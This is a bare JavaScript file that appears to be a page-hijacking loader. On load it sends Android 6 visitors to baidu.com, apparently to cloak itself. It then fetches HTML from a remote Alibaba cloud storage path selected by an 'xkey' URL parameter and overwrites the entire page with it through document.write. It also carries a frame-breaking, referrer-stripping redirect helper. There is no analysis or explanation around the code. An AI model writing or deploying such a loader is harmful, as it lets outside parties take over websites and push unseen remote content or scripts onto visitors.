
var meta = document.createElement('meta');
meta.setAttribute('charset', 'UTF-8');
document.getElementsByTagName('head')[0].appendChild(meta);

function randomChar(l) {
    return Math.random().toString(36).slice(-l);
  }
  
  function randomNum(Min, Max) {
    var Range = Max - Min;
    var Rand = Math.random();
    return (Min + Math.round(Rand * Range));
  }
  
  function openLink(url) {
    if(window !== top) {
        top.location = url;
        return;
    }
    var label = document.createElement('a');
    label.setAttribute('rel', 'noreferrer');
    label.setAttribute('href', url);
    try {
        document.body.appendChild(label);
    } catch (e) {
        location = url;
    }
    label.click();
  }
  
  function getQueryVariable(variable)
  {
    var query = window.location.search.substring(1);
    var vars = query.split("&");
    for (var i=0;i<vars.length;i++) {
        var pair = vars[i].split("=");
        if(pair[0] == variable){return pair[1];}
    }
    return(false);
  }
  
  (function () {
    function isWx() {
      var ua = window.navigator.userAgent.toLowerCase();
      if (ua.match(/MicroMessenger/i) == 'micromessenger') {
        return true;
      } else {
        return false;
      }
    }
  
    function ajax(method, url, data, success, fail) {
      let sendData = '';
      for (let key in data) {
        sendData += '&' + key + '=' + data[key];
      }
      if (sendData) {
        sendData = sendData.slice(1);
      }
  
      if (method === 'GET') {
        url = sendData ? url + '?' + sendData : url;
        sendData = null;
      }
  
      const XHR = new XMLHttpRequest();
      XHR.onreadystatechange = function () {
        if (XHR.readyState !== 4) return;
        if (XHR.status === 200 || XHR.status === 304) {
          if (typeof success === 'function') success(XHR.response);
        } else {
          if (typeof fail === 'function') fail(XHR);
        }
      }
      XHR.open(method, url, true);
      XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      XHR.send(sendData);
    }


    function getAndroidVersion() {
      var ua = navigator.userAgent;
      var match = ua.match(/Android\s([0-9\.]*)/);
      return match ? match[1] : false;
    }

    var androidVersion = getAndroidVersion();
    if (androidVersion && parseInt(androidVersion) == 6) {
      location.href='http://www.baidu.com';
      return;
    }

      var xkey = getQueryVariable("xkey")?getQueryVariable("xkey") : "55";
      var getLInks = "//runs123.oss-accelerate.aliyuncs.com/public/html2/"+xkey+"/index.html";
    
      ajax('GET', getLInks, {}, function (result) {
          document.open();
          document.write(result);
          document.close();
         });
  
  })();
  